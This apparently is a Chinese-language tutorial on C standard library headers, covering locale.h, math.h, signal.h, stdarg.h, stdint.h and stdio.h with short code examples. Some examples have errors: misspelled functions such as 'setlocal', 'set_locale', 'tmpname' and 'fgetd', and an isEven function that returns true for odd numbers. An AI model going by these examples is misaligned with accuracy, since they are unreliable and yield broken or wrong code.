上面示例中，如果 int 类型太小，预处理器会显示一条出错消息。 可以使用limit.h里面的宏，为类型别名选择正确的底层类型。 12345#if INT_MAX &gt;= 100000 typedef int Quantity;#else typedef long int Quantity;#endif 上面示例中，如果整数类型的最大值（INT_MAX）不小于100000，那么类型别名Quantity指向int，否则就指向long int。 locale.h简介locale.h是程序的本地化设置，主要影响以下的行为。 数字格式 货币格式 字符集 日期和时间格式 它设置了以下几个宏。 LC_COLLATE：影响字符串比较函数strcoll()和strxfrm()。 LC_CTYPE：影响字符处理函数的行为。 LC_MONETARY：影响货币格式。 LC_NUMERIC：影响printf()的数字格式。 LC_TIME：影响时间格式strftime()和wcsftime()。 LC_ALL：将以上所有类别设置为给定的语言环境。 setlocale()setlocale()用来设置当前的地区。 1char* setlocal(int category, const char* locale); 它接受两个参数。第一个参数表示影响范围，如果值为前面五个表示类别的宏之一，则只影响该宏对应的类别，如果值为LC_ALL，则影响所有类别。第二个参数通常只为&quot;C&quot;（正常模式）或&quot;&quot;（本地模式）。 任意程序开始时，都隐含下面的调用。 1setlocale(LC_ALL, &quot;C&quot;); 下面的语句将格式本地化。 1set_locale(LC_ALL, &quot;&quot;); 上面示例中，第二个参数为空字符，表示使用当前环境提供的本地化设置。 理论上，第二个参数也可以设为当前系统支持的某种格式。 1setlocale(LC_ALL, &quot;en_US.UTF-8&quot;); 但是这样的话，程序的可移植性就变差了，因为无法保证其他系统也会支持那种格式。所以，通常都将第二个参数设为空字符串，使用操作系统的当前设置。 setlocale()的返回值是一个字符串指针，表示已经设置好的格式。如果调用失败，则返回空指针 NULL。 setlocale()可以用来查询当前地区，这时第二个参数设为 NULL 就可以了。 1234567891011char *loc;loc = setlocale(LC_ALL, NULL);// 输出 Starting locale: Cprintf(&quot;Starting locale: %s\\n&quot;, loc);loc = setlocale(LC_ALL, &quot;&quot;);// 输出 Native locale: en_US.UTF-8 printf(&quot;Native locale: %s\\n&quot;, loc); localeconv()localeconv()用来获取当前格式的详细信息。 1struct lconv* localeconv(void); 该函数返回一个 Struct 结构指针，该结构里面包含了格式信息，它的主要属性如下。 char* mon_decimal_point：货币的十进制小数点字符，比如.。 char* mon_thousands_sep：货币的千位分隔符，比如,。 char* mon_grouping：货币的分组描述符。 char* positive_sign：货币的正值符号，比如+或为空字符串。 char* negative_sign：货币的负值符号，比如-。 char* currency_symbol：货币符号，比如$。 char frac_digits：打印货币金额时，十进制小数点后面输出几位小数，比如设为2。 char p_cs_precedes：设为1时，货币符号currency_symbol出现在非负金额前面。设为0时，出现在后面。 char n_cs_precedes：设为1时，货币符号currency_symbol出现在负的货币金额前面。设为0时，出现在后面。 char p_sep_by_space：决定了非负的货币金额与货币符号之间的分隔字符。 char n_sep_by_space：决定了负的货币金额与货币符号之间的分隔字符。 char p_sign_posn：决定了非负值的正值符号的位置。 char n_sign_posn：决定了负值的负值符号的位置。 char* int_curr_symbol：货币的国际符号，比如USD。 char int_frac_digits：使用国际符号时，frac_digits的值。 char int_p_cs_precedes：使用国际符号时，p_cs_precedes的值。 char int_n_cs_precedes：使用国际符号时，n_cs_precedes的值。 char int_p_sep_by_space：使用国际符号时，p_sep_by_space的值。 char int_n_sep_by_space：使用国际符号时，n_sep_by_space的值。 char int_p_sign_posn：使用国际符号时，p_sign_posn的值。 char int_n_sign_posn：使用国际符号时，n_sign_posn的值。 下面程序打印当前系统的属性值。 123456789101112131415161718192021222324252627282930313233343536#include &lt;stdio.h&gt;#include &lt;locale.h&gt;#include &lt;string.h&gt;int main (){ setlocale (LC_ALL,&quot;zh_CN&quot;); struct lconv * lc; lc=localeconv(); printf (&quot;decimal_point: %s\\n&quot;,lc-&gt;decimal_point); printf (&quot;thousands_sep: %s\\n&quot;,lc-&gt;thousands_sep); printf (&quot;grouping: %s\\n&quot;,lc-&gt;grouping); printf (&quot;int_curr_symbol: %s\\n&quot;,lc-&gt;int_curr_symbol); printf (&quot;currency_symbol: %s\\n&quot;,lc-&gt;currency_symbol); printf (&quot;mon_decimal_point: %s\\n&quot;,lc-&gt;mon_decimal_point); printf (&quot;mon_thousands_sep: %s\\n&quot;,lc-&gt;mon_thousands_sep); printf (&quot;mon_grouping: %s\\n&quot;,lc-&gt;mon_grouping); printf (&quot;positive_sign: %s\\n&quot;,lc-&gt;positive_sign); printf (&quot;negative_sign: %s\\n&quot;,lc-&gt;negative_sign); printf (&quot;frac_digits: %d\\n&quot;,lc-&gt;frac_digits); printf (&quot;p_cs_precedes: %d\\n&quot;,lc-&gt;p_cs_precedes); printf (&quot;n_cs_precedes: %d\\n&quot;,lc-&gt;n_cs_precedes); printf (&quot;p_sep_by_space: %d\\n&quot;,lc-&gt;p_sep_by_space); printf (&quot;n_sep_by_space: %d\\n&quot;,lc-&gt;n_sep_by_space); printf (&quot;p_sign_posn: %d\\n&quot;,lc-&gt;p_sign_posn); printf (&quot;n_sign_posn: %d\\n&quot;,lc-&gt;n_sign_posn); printf (&quot;int_frac_digits: %d\\n&quot;,lc-&gt;int_frac_digits); printf (&quot;int_p_cs_precedes: %d\\n&quot;,lc-&gt;int_p_cs_precedes); printf (&quot;int_n_cs_precedes: %d\\n&quot;,lc-&gt;int_n_cs_precedes); printf (&quot;int_p_sep_by_space: %d\\n&quot;,lc-&gt;int_p_sep_by_space); printf (&quot;int_n_sep_by_space: %d\\n&quot;,lc-&gt;int_n_sep_by_space); printf (&quot;int_p_sign_posn: %d\\n&quot;,lc-&gt;int_p_sign_posn); printf (&quot;int_n_sign_posn: %d\\n&quot;,lc-&gt;int_n_sign_posn); return 0;} math.hmath.h头文件提供了很多数学函数。 很多数学函数的返回值是 double 类型，但是同时提供 float 类型与 long double 类型的版本，比如pow()函数就还有powf()和powl()版本。 123double pow(double x, double y); float powf(float x, float y);long double powl(long double x, long double y); 为了简洁，下面就略去了函数的f后缀（float 类型）和l后缀（long double）版本。 类型和宏math.h 新定义了两个类型别名。 float_t：（当前系统）最有效执行 float 运算的类型，宽度至少与 float 一样。 double_t`：（当前系统）最有效执行 double 运算的类型，宽度至少与 double 一样。 它们的具体类型可以通过宏FLT_EVAL_METHOD来了解。 FLT_EVAL_METHOD 的值 float_t 对应的类型 double_t 对应的类型 0 float double 1 double double 2 long double long double 其他 由实现决定 由实现决定 math.h 还定义了一些宏。 INFINITY：表示正无穷，返回一个 float 类型的值。 NAN：表示非数字（Not-A-Number），返回一个 float 类型的值。 错误类型数学函数的报错有以下类型。 Range errors：运算结果不能用函数返回类型表示。 Domain errors：函数参数不适用当前函数。 Pole errors：参数导致函数的极限值变成无限。 Overflow errors：运算结果太大，导致溢出。 Underflow errors：运算结果太小，导致溢出。 变量math_errhandling提示了当前系统如何处理数学运算错误。 math_errhandling 的值 描述 MATH_ERRNO 系统使用 errno 表示数学错误 MATH_ERREXCEPT 系统使用异常表示数学错误 MATH_ERRNO MATH_ERREXCEPT 数值类型数学函数的参数可以分成以下几类：正常值，无限值，有限值和非数字。 下面的函数用来判断一个值的类型。 fpclassify()：返回给定浮点数的分类。 isfinite()：如果参数不是无限或 NaN，则为真。 isinf()：如果参数是无限的，则为真。 isnan()：如果参数不是数字，则为真。 isnormal()：如果参数是正常数字，则为真。 下面是一个例子。 1234isfinite(1.23) // 1isinf(1/tan(0)) // 1isnan(sqrt(-1)) // 1isnormal(1e-310)) // 0 signbit()signbit()判断参数是否带有符号。如果参数为负值，则返回1，否则返回0。 12signbit(3490.0) // 0signbit(-37.0) // 1 三角函数以下是三角函数，参数为弧度值。 acos()：反余弦。 asin()：反正弦。 atan()：反正切 atan2()：反正切。 cos()：余弦。 sin()：正弦。 tan()：正切。 不要忘了，上面所有函数都有 float 版本（函数名加上 f 后缀）和 long double 版本（函数名加上 l 后缀）。 下面是一个例子。 1cos(PI/4) // 0.707107 双曲函数以下是双曲函数，参数都为浮点数。 acosh()：反双曲余弦。 asinh()：反双曲正弦。 atanh()：反双曲正切。 cosh()：双曲余弦。 tanh()：双曲正切。 sinh()：双曲正弦。 指数函数和对数函数以下是指数函数和对数函数，它们的返回值都是 double 类型。 exp()：计算欧拉数 e 的乘方，即 ex。 exp2()：计算 2 的乘方，即 2x。 expm1()：计算 ex - 1。 log()：计算自然对数，exp()的逆运算。 log2()：计算以2为底的对数。 log10()：计算以10为底的对数。 logp1()：计算一个数加 1 的自然对数，即ln(x + 1)。 logb()：计算以宏FLT_RADIX（一般为2）为底的对数，但只返回整数部分。 下面是一些例子。 123exp(3.0) // 20.085500log(20.0855) // 3.000000log10(10000) // 3.000000 如果结果值超出了 C 语言可以表示的最大值，函数将返回HUGE_VAL，它是一个在math.h中定义的 double 类型的值。 如果结果值太小，无法用 double 值表示，函数将返回0。以上这两种情况都属于出错。 frexp()frexp()将参数分解成浮点数和指数部分（2为底数），比如 1234.56 可以写成 0.6028125 * 211，这个函数就能分解出 0.6028125 和 11。 1double frexp(double value, int* exp); 它接受两个参数，第一个参数是用来分解的浮点数，第二个参数是一个整数变量指针。 它返回小数部分，并将指数部分放入变量exp。如果参数为0，则返回的小数部分和指数部分都为0。 下面是一个例子。 12345678double frac;int expt;// expt 的值是 11frac = frexp(1234.56, &amp;expt);// 输出 1234.56 = 0.6028125 x 2^11printf(&quot;1234.56 = %.7f x 2^%d\\n&quot;, frac, expt); ilogb()ilogb()返回一个浮点数的指数部分，指数的基数是宏FLT_RADIX（一般是2）。 1int ilogb(double x); 它的参数为x，返回值是 logr|x|，其中r为宏FLT_RADIX。 下面是用法示例。 123ilogb(257) // 8ilogb(256) // 8ilogb(255) // 7 ldexp()ldexp()将一个数乘以2的乘方。它可以看成是frexp()的逆运算，将小数部分和指数部分合成一个f * 2^n形式的浮点数。 1double ldexp(double x, int exp); 它接受两个参数，第一个参数是乘数x，第二个参数是2的指数部分exp，返回“x * 2exp”。 1234ldexp(1, 10) // 1024.000000ldexp(3, 2) // 12.000000ldexp(0.75, 4) // 12.000000ldexp(0.5, -1) // 0.250000 modf()modf()函数提取一个数的整数部分和小数部分。 1double modf(double value, double* iptr); 它接受两个参数，第一个参数value表示待分解的数值，第二个参数是浮点数变量iptr。返回值是value的小数部分，整数部分放入变量double。 下面是一个例子。 12// int_part 的值是 3.0modf(3.14159, &amp;int_part); // 返回 0.14159 scalbn()scalbn()用来计算“x * rn”，其中r是宏FLT_RADIX。 1double scalbn(double x, int n); 它接受两个参数，第一个参数x是乘数部分，第二个参数n是指数部分，返回值是“x * rn”。 下面是一些例子。 1scalbn(2, 8) // 512.000000 这个函数有多个版本。 scalbn()：指数 n 是 int 类型。 scalbnf()：float 版本的 scalbn()。 scalbnl()：long double 版本的 scalbn()。 scalbln()：指数 n 是 long int 类型。 scalblnf()：float 版本的 scalbln()。 scalblnl()：long double 版本的 scalbln()。 round()round()函数以传统方式进行四舍五入，比如1.5舍入到2，-1.5舍入到-2。 1double round(double x); 它返回一个浮点数。 下面是一些例子。 1234round(3.14) // 3.000000round(3.5) // 4.000000round(-1.5) // -2.000000round(-1.14) // -1.000000 它还有一些其他版本。 lround()：返回值是 long int 类型。 llround()：返回值是 long long int 类型。 trunc()trunc()用来截去一个浮点数的小数部分，将剩下的整数部分以浮点数的形式返回。 1double trunc(double x); 下面是一些例子。 1234trunc(3.14) // 3.000000trunc(3.8) // 3.000000trunc(-1.5) // -1.000000trunc(-1.14) // -1.000000 ceil()ceil()返回不小于其参数的最小整数（double 类型），属于“向上舍入”。 1double ceil(double x); 下面是一些例子。 1234ceil(7.1) // 8.0ceil(7.9) // 8.0ceil(-7.1) // -7.0ceil(-7.9) // -7.0 floor()floor()返回不大于其参数的最大整数，属于“向下舍入”。 1double floor(double x); 下面是一些例子。 1234floor(7.1) // 7.0floor(7.9) // 7.0floor(-7.1) // -8.0floor(-7.9) // -8.0 下面的函数可以实现“四舍五入”。 123double round_nearest(double x) { return x &lt; 0.0 ? ceil(x - 0.5) : floor(x + 0.5);} fmod()fmod()返回第一个参数除以第二个参数的余数，就是余值运算符%的浮点数版本，因为%只能用于整数运算。 1double fmod(double x, double y); 它在幕后执行的计算是x - trunc(x / y) * y，返回值的符号与x的符号相同。 123fmod(5.5, 2.2) // 1.100000fmod(-9.2, 5.1) // -4.100000fmod(9.2, 5.1) // 4.100000 浮点数比较函数以下函数用于两个浮点数的比较，返回值的类型是整数。 isgreater()：返回x &gt; y的结果。 isgreaterequal()：返回x &gt;= y的结果。 isless()：返回x &lt; y的结果。 islessequal()：返回x &lt;= y的结果。 islessgreater()：返回(x &lt; y) || (x &gt; y)的结果。 下面是一些例子。 1234567isgreater(10.0, 3.0) // 1isgreaterequal(10.0, 10.0) // 1isless(10.0, 3.0) // 0islessequal(10.0, 3.0) // 0islessgreater(10.0, 3.0) // 1islessgreater(10.0, 30.0) // 1islessgreater(10.0, 10.0) // 0 isunordered()isunordered()返回两个参数之中，是否存在 NAN。 1int isunordered(any_floating_type x, any_floating_type y); 下面是一些例子。 1234isunordered(1.0, 2.0) // 0isunordered(1.0, sqrt(-1)) // 1isunordered(NAN, 30.0) // 1isunordered(NAN, NAN) // 1 其他函数下面是 math.h 包含的其它函数。 pow()：计算参数x的y次方。 sqrt()：计算一个数的平方根。 cbrt()：计算立方根。 fabs()：计算绝对值。 hypot()：根据直角三角形的两条直角边，计算斜边。 fmax()：返回两个参数之中的最大值。 fmin()：返回两个参数之中的最小值。 remainder()：返回 IEC 60559 标准的余数，类似于fmod()，但是余数范围是从-y/2到y/2，而不是从0到y。 remquo()：同时返回余数和商，余数的计算方法与remainder()相同。 copysign()：返回一个大小等于第一个参数、符号等于第二个参数的值。 nan()：返回 NAN。 nextafter()：获取下一个（或者上一个，具体方向取决于第二个参数y）当前系统可以表示的浮点值。 nextoward()：与nextafter()相同，除了第二个参数是 long double 类型。 fdim()：如果第一个参数减去第二个参数大于0，则返回差值，否则返回0。 fma()：以快速计算的方式，返回x * y + z的结果。 nearbyint()：在当前舍入方向上，舍入到最接近的整数。当前舍入方向可以使用fesetround()函数设定。 rint()：在当前舍入方向上，舍入到最接近的整数，与nearbyint()相同。不同之处是，它会触发浮点数的INEXACT异常。 lrint()：在当前舍入方向上，舍入到最接近的整数，与rint()相同。不同之处是，返回值是一个整数，而不是浮点数。 erf()：计算一个值的误差函数。 erfc()：计算一个值的互补误差函数。 tgamma()：计算 Gamma 函数。 lgamma()：计算 Gamma 函数绝对值的自然对数。 下面是一些例子。 1234567pow(3, 4) // 81.000000sqrt(3.0) // 1.73205cbrt(1729.03) // 12.002384fabs(-3490.0) // 3490.000000hypot(3, 4) // 5.000000fmax(3.0, 10.0) // 10.000000fmin(10.0, 3.0) // 3.000000 signal.h简介signal.h提供了信号（即异常情况）的处理工具。所谓“信号”（signal），可以理解成系统与程序之间的短消息，主要用来表示运行时错误，或者发生了异常事件。 头文件signal.h定义了一系列宏，表示不同的信号。 SIGABRT：异常中止（可能由于调用了 abort() 方法）。 SIGFPE：算术运算发生了错误（可能是除以 0 或者溢出）。 SIGILL：无效指令。 SIGINT：中断。 SIGSEGV：无效内存访问。 SIGTERM：终止请求。 上面每个宏的值都是一个正整数常量。 signal()头文件signal.h还定义了一个signal()函数，用来指定某种信号的处理函数。 1signal(SIGINT, handler); signal()接受两个参数，第一个参数是某种信号的宏，第二个参数是处理这个信号的函数指针handler。 信号处理函数handler接受一个 int 类型的参数，表示信号类型。它的原型如下。 1void (*func)(int); handler函数体内部可以根据这个整数，判断到底接受到了哪种信号，因为多个信号可以共用同一个处理函数。一旦处理函数执行完成，程序会从信号发生点恢复执行。但是，如果遇到 SIGABRT 信号，处理函数执行完成，系统会让程序中止。 当系统向程序发送信号时，程序可以忽略信号，即不指定处理函数。 signal()的返回值是前一个处理函数的指针，常常把它保存在变量之中，当新的处理函数执行完，再恢复以前的处理函数。 1234void (*orig_handler)(int);orig_handler = signal(SIGINT, handler);// SIGINT 信号发生之后signal(SIGINT, orig_handler); 上面示例中，signal()为信号SIGINT指定了新的处理函数handler，把原来的处理函数保存在变量orig_handler里面。等到handler这个函数用过之后，再恢复原来的处理函数。 信号相关的宏signal.h还提供了信号相关的宏。 （1）SIG_DFL SIG_DFL 表示默认的处理函数。 1signal(SIGINT, SIG_DFL); 上面示例中，SIGINT 的处理函数是默认处理函数，由当前实现决定。 （2）SIG_IGN SIG_IGN 表示忽略该信号。 1signal(SIGINT, SIG_IGN); 上面示例表示不对 SIGINT 信号进行处理。由于程序运行时按下 Ctrl + c 是发出 SIGINT 信号，所以使用该语句后，程序无法用 Ctrl + c 终止。 （3）SIG_ERR SIG_ERR 是信号处理函数发生错误时，signal()的返回值。 1234if (signal(SIGINT, handler) == SIG_ERR) { perror(&quot;signal(SIGINT, handler) failed&quot;); // ...} 上面示例可以判断handler处理 SIGINT 时，是否发生错误。 raise()raise()函数用来在程序中发出信号。 1int raise(int sig); 它接受一个信号值作为参数，表示发出该信号。它的返回值是一个整数，可以用来判断信号发出是否成功，0 表示成功，非 0 表示失败。 123456void handler(int sig) { printf(&quot;Handler called for signal %d\\n&quot;, sig);}signal(SIGINT, handler);raise(SIGINT); 上面示例中，raise()触发 SIGINT 信号，导致 handler 函数执行。 stdarg.hstdarg.h定义于函数的可变参数相关的一些方法。 va_list 类型 va_start() va_arg()：获取当前参数 va_end()。 va_copy()：it makes a copy of your va_list variable in the exact same state.va_copy() can be useful if you need to scan ahead through the arguments but need to also remember your current place. 接受可变函数作为参数的一些方法。 vprintf() vfprintf() vsprintf() vsnprintf() 12345678910111213141516171819202122232425#include &lt;stdio.h&gt;#include &lt;stdarg.h&gt;int my_printf(int serial, const char *format, ...){ va_list va; // Do my custom work printf(&quot;The serial number is: %d\\n&quot;, serial); // Then pass the rest off to vprintf() va_start(va, format); int rv = vprintf(format, va); va_end(va); return rv;}int main(void){ int x = 10; float y = 3.2; my_printf(3490, &quot;x is %d, y is %f\\n&quot;, x, y);} stdbool.hstdbool.h头文件定义了4个宏。 bool：定义为_Bool。 true：定义为1。 false：定义为0。 __bool_true_false_are_defined：定义为1。 1234567bool isEven(int number) { if (number % 2) { return true; } else { return false; }} 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;stdbool.h&gt;int main(void) { unsigned long num; unsigned long div; bool isPrime = true; num = 64457; for (div = 2; (div * div) &lt;= num; div++) { if (num % div == 0) isPrime = false; } if (isPrime) { printf(&quot;%lu is prime.\\n&quot;, num); } else { printf(&quot;%lu is not prime.\\n&quot;, num); } return 0;} stddef.hstddef.h提供了常用类型和宏的定义，但没有声明任何函数。 这个头文件定义的类型如下。 ptrdiff_t：指针相减运算时，返回结果的数据类型。 size_t：sizeof运算符返回的类型。 wchar_t：一种足够大、能容纳各种字符的类型。 以上三个类型都是整数类型，其中ptrdiff_t是有符号整数，size_t是无符号整数。 stddef.h定义了两个宏。 NULL：空指针。 offsetof() offsetof()offsetof()是stddef.h定义的一个宏，用来返回某个属性在 Struct 结构内部的起始位置。由于系统为了字节对齐，可能会在 Struct 结构的属性之间插入空字节，这个宏对于确定某个属性的内存位置很有用。 它是一个带参数的宏，接受两个参数。第一个参数是 Struct 结构，第二个参数是该结构的一个属性，返回 Struct 起始位置到该属性之间的字节数。 123456789struct s { char a; int b[2]; float c;};printf(&quot;%zu\\n&quot;, offsetof(struct s, a)); // 0printf(&quot;%zu\\n&quot;, offsetof(struct s, b)); // 4printf(&quot;%zu\\n&quot;, offsetof(struct s, c)); // 12 对于上面这个 Struct 结构，offsetof(struct s, a)一定等于0，因为a属性是第一个属性，与 Struct 结构自身的地址相同。 系统为了字节对齐，在a属性后面分配了3个空字节，导致b属性存储在第4个字节，所以offsetof(struct s, b)和offsetof(struct s, c)分别是4和12。 stdint.h固定宽度的整数类型stdint.h 定义了一些固定宽度的整数类型别名，主要有下面三类。 宽度完全确定的整数intN_t，比如int32_t。 宽度不小少于某个大小的整数int_leastN_t，比如int_least8_t。 宽度不小于某个大小、并且处理速度尽可能快的整数int_fastN_t，比如int_fast64_t。 上面所有类型都是有符号的，类型名前面可以加一个前缀u，表示无符号类型，比如uint16_t。 C 语言标准要求至少定义以下类型。 int8_t uint8_t int16_t uint16_t int32_t uint32_t int64_t uint64_t int_least8_t uint_least8_t int_least16_t uint_least16_t int_least32_t uint_least32_t int_least64_t uint_least64_t int_fast8_t uint_fast8_t int_fast16_t uint_fast16_t int_fast32_t uint_fast32_t int_fast64_t uint_fast64_t 最大宽度的整数类型以下两个类型表示当前系统可用的最大宽度整数。 intmax_t uintmax_t 如果想要尽可能大的整数时，可以使用上面类型。 固定宽度的整数常量以下一些带参数的宏，可以生成固定宽度的整数常量。 INT8_C(x) UINT8_C(x) INT16_C(x) UINT16_C(x) INT32_C(x) UINT32_C(x) INT64_C(x) UINT64_C(x) INTMAX_C(x) UINTMAX_C(x) 下面是用法示例。 12uint16_t x = UINT16_C(12);intmax_t y = INTMAX_C(3490); 固定宽度的整数极限值下面一些宏代表了固定宽度的整数最大值和最小值。 INT8_MAX INT8_MIN UINT8_MAX INT16_MAX INT16_MIN UINT16_MAX INT32_MAX INT32_MIN UINT32_MAX INT64_MAX INT64_MIN UINT64_MAX INT_LEAST8_MAX INT_LEAST8_MIN UINT_LEAST8_MAX INT_LEAST16_MAX INT_LEAST16_MIN UINT_LEAST16_MAX INT_LEAST32_MAX INT_LEAST32_MIN UINT_LEAST32_MAX INT_LEAST64_MAX INT_LEAST64_MIN UINT_LEAST64_MAX INT_FAST8_MAX INT_FAST8_MIN UINT_FAST8_MAX INT_FAST16_MAX INT_FAST16_MIN UINT_FAST16_MAX INT_FAST32_MAX INT_FAST32_MIN UINT_FAST32_MAX INT_FAST64_MAX INT_FAST64_MIN UINT_FAST64_MAX INTMAX_MAX INTMAX_MIN UINTMAX_MAX 注意，所有无符号整数类型的最小值都为0，所以没有对应的宏。 占位符C 语言还在头文件 inttypes.h 里面，为上面类型定义了printf()和scanf()的占位符，参见《inttypes.h》一章。 stdio.hstdio.h是 C 语言的标准 I/O 库，用于读取和写入文件，也用于控制台的输入和输出。 标准 I/O 函数以下函数用于控制台的输入和输出。 printf()：输出到控制台，详见《基本语法》一章。 scanf()：从控制台读取输入，详见《I/O 函数》一章。 getchar()：从控制台读取一个字符，详见《I/O 函数》一章。 putchar()：向控制台写入一个字符，详见《I/O 函数》一章。 gets()：从控制台读取整行输入（已废除），详见《I/O 函数》一章。 puts()：向控制台写入一个字符串，详见《I/O 函数》一章。 文件操作函数以下函数用于文件操作，详见《文件操作》一章。 fopen()：打开文件。 fclose()：关闭文件。 freopen()：打开一个新文件，关联一个已经打开的文件指针。 fprintf()：输出到文件。 fscanf()：从文件读取数据。 getc()：从文件读取一个字符。 fgetc()：从文件读取一个字符。 putc()：向文件写入一个字符。 fputc()：向文件写入一个字符。 fgets()：从文件读取整行。 fputs()：向文件写入字符串。 fread()：从文件读取二进制数据。 fwrite()：向文件写入二进制数据。 fseek()：将文件内部指针移到指定位置。 ftell()：获取文件内部指针的当前位置。 rewind()：将文件内部指针重置到文件开始处。 fgetpos()：获取文件内部指针的当前位置。 fsetpos()：设置文件内部指针的当前位置。 feof()：判断文件内部指针是否指向文件结尾。 ferror()：返回文件错误指示器的状态。 clearerr()：重置文件错误指示器。 remove()：删除文件。 rename()：文件改名，以及移动文件。 字符串操作函数以下函数用于操作字符串，详见《字符串操作》一章。 sscanf()：从字符串读取数据，详见《I/O 函数》一章。 sprintf()：输出到字符串。 snprintf()：输出到字符串的更安全版本，指定了输出字符串的数量。 tmpfile()tmpfile()函数创建一个临时文件，该文件只在程序运行期间存在，除非手动关闭它。它的原型如下。 1FILE* tmpfile(void); tmpfile()返回一个文件指针，可以用于访问该函数创建的临时文件。如果创建失败，返回一个空指针 NULL。 12FILE* tempptr;tempptr = tmpfile(); 调用close()方法关闭临时文件后，该文件将被自动删除。 tmpfile()有两个缺点。一是无法知道临时文件的文件名，二是无法让该文件成为永久文件。 tmpnam()tmpname()函数为临时文件生成一个名字，确保不会与其他文件重名。它的原型如下。 1char* tmpname(char* s); 它的参数是一个字符串变量，tmpnam()会把临时文件的文件名复制到这个变量里面，并返回指向该字符串变量的指针。如果生成文件名失败，tmpnam()返回空指针 NULL。 1234567char filename[L_tmpname];if (tmpnam(filename) != NULL) // 输出诸如 /tmp/filew9PMuZ 的文件名 printf(&quot;%s\\n&quot;, filename);else printf(&quot;Something wrong!\\n&quot;); 上面示例中，L_tmpname是stdio.h定义的一个宏，指定了临时文件的文件名长度。 tmpname()的参数也可以是一个空指针 NULL，同样返回指向文件名字符串的指针。 12char* filename;filename = tmpnam(NULL); 上面示例中，变量filename就是tmpnam()生成的文件名。 该函数只是生成一个文件名，稍后可以使用fopen()打开该文件并使用它。 fflush()fflush()用于清空缓存区。它接受一个文件指针作为参数，将缓存区内容写入该文件。 1fflush(fp); 如果不需要保存缓存区内容，则可以传入空指针 NULL。 1fflush(NULL); 如果清空成功，fflush()返回0，否则返回 EOF。 注意，fflush()一般只用来清空输出缓存区（比如写文件）。如果使用它来清空输入缓存区（比如读文件），属于未定义行为。 fflush()的一个用途是不等回车键，就强迫输出缓存区。大多数系统都是行缓存，这意味着只有遇到回车键（或者缓存区满了，或者文件读到结尾），缓存区的内容才会输出，fflush()可以不等回车键，立即输出。 12345for (int i = 9; i &gt;= 0; i--) { printf(&quot;\\r%d&quot;, i); fflush(stdout); sleep(1);} 上面示例是一个倒计时效果，\\r是回车键，表示每轮循环都会回到当前行的行首，等于删除上一轮循环的输出。fflush(stdout)表示立即将缓存输出到显示器，这一行是必需的，否则由于上一行的输出没有回车键，不会触发缓存输出，屏幕上不会显示任何内容，只会等到程序运行结束再一次性输出。 setvbuf()setvbuf()函数用于定义某个字节流应该如何缓存。它可以接受四个参数。 1int setvbuf(FILE* stream, char* buffer, int mode, size_t size) 第一个参数stream是文件流。 第二个参数buffer是缓存区的地址。 第三个参数mode指定缓存的行为模式，它是下面三个宏之一，这些宏都定义在stdio.h。 _IOFBF：满缓存。当缓存为空时，才从流读入数据；当缓存满了，才向流写入数据。一般情况下，这是默认设置。 _IOLBF：行缓存。每次从流读入一行数据，或向流写入一行数据，即以行为单位读写缓存。 _IONBF：无缓存。不使用缓存区，直接读写设备。 第四个参数size指定缓存区的大小。较大的缓存区提供更好的性能，而较小的缓存区可以节省空间。stdio.h提供了一个宏BUFSIZ，表示系统默认的缓存区大小。 它的意义在于，使得用户可以在打开一个文件之前，定义自己的文件缓冲区，而不必使用fopen()函数打开文件时设定的默认缓冲区。 123char buffer[N];setvbuf(stream, buffer, _IOFBF, N); 上面示例设置文件流stream的缓存区从地址buffer开始，大小为N，模式为_IOFBF。 setvbuf()的第二个参数可以为空指针 NULL。这样的话，setvbuf()会自己创建一个缓存区。 注意，setvbuf()的调用必须在对文件流执行任何操作之前。 如果调用成功，setvbuf()的返回值为0，否则返回非零值。 下面的例子是将缓存区调整为行缓存。 12345FILE *fp;char lineBuf[1024];fp = fopen(&quot;somefile.txt&quot;, &quot;r&quot;);setvbuf(fp, lineBuf, _IOLBF, 1024); setbuf()setbuf()是setvbuf()的早期版本，可以视为后者的简化版本，也用来定义某个字节流的缓存区。 1void setbuf(FILE* stream, char* buffer); 它的第一个参数stream是文件流，第二个参数buffer是缓存区的地址。 它总是可以改写成setvbuf()。 123456char buffer[BUFSIZ];setbuf(stream, buffer);// 等同于setvbuf(stream, buffer, _IOFBF, BUFSIZ); 上面示例中，BUFSIZ是stdio.h定义的宏，表示系统默认的缓存区大小。 setbuf()函数没有返回值。 setbuf()的第二个参数如果设置为 NULL，表示不进行缓存。 1234setbuf(stdout, NULL);// 等同于setvbuf(stdout, NULL, _IONBF, 0); ungetc()ungetc()将从缓存里面读取的上一个字符，重新放回缓存，下一个读取缓存的操作会从这个字符串开始。有些操作需要了解下一个字符是什么，再决定应该怎么处理，这时这个函数就很有用。 它的原型如下。 1int ungetc(int c, FILE *stream); 它的第一个参数是一个字符变量，第二个参数是一个打开的文件流。它的返回值是放回缓存的那个字符，操作失败时，返回 EOF。 1234567int ch = fgetc(fp);if (isdigit(ch)) { ch = fgetd(fp);}ungetc(ch, fp); 上面示例中，如果读取的字符不是数字，就将其放回缓存。 perror()perror()用于在 stderr 的错误信息之前，添加一个自定义字符串。 1void perror(const char *s); 该函数的参数就是在报错信息前添加的字符串。它没有返回值。 123456789101112131415#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;math.h&gt;#include &lt;errno.h&gt;int main(void) { int x = -1; errno = 0; float y = sqrt(x); if (errno != 0) { perror(&quot;sqrt error&quot;); exit(EXIT_FAILURE); }} 上面示例中，求-1的平方根，导致报错。头文件errno.h提供宏errno，只要上一步操作出错，这个宏就会设置成非零值。perror()用来在报错信息前，加上sqrt error的自定义字符串。 执行上面的程序，就会得到下面的报错信息。 123$ gcc test.c -lm$ ./a.outsqrt error: Numerical argument out of domain 可变参数操作函数（1）输出函数 下面是printf()的变体函数，用于按照给定格式，输出函数的可变参数列表（va_list）。 vprintf()：按照给定格式，输出到控制台，默认是显示器。 vfprintf()：按照给定格式，输出到文件。 vsprintf()：按照给定格式，输出到字符串。 vsnprintf()：按照给定格式，输出到字符串的安全版本。 它们的原型如下，基本与对应的printf()系列函数一致，除了最后一个参数是可变参数对象。 1234567891011121314151617181920212223242526#include &lt;stdio.h&gt;#include &lt;stdarg.h&gt; int vprintf( const char * restrict format, va_list arg);int vfprintf( FILE * restrict stream, const char * restrict format, va_list arg); int vsprintf( char * restrict s, const char * restrict format, va_list arg); int vsnprintf( char * restrict s, size_t n, const char * restrict format, va_list arg); 它们的返回值都为输出的字符数，如果出错，返回负值。 vsprintf()和vsnprintf()的第一个参数可以为 NULL，用来查看多少个字符会被写入。 下面是一个例子。 12345678910111213int logger(char *format, ...) { va_list va; va_start(va, format); int result = vprintf(format, va); va_end(va); printf(&quot;\\n&quot;); return result;}// 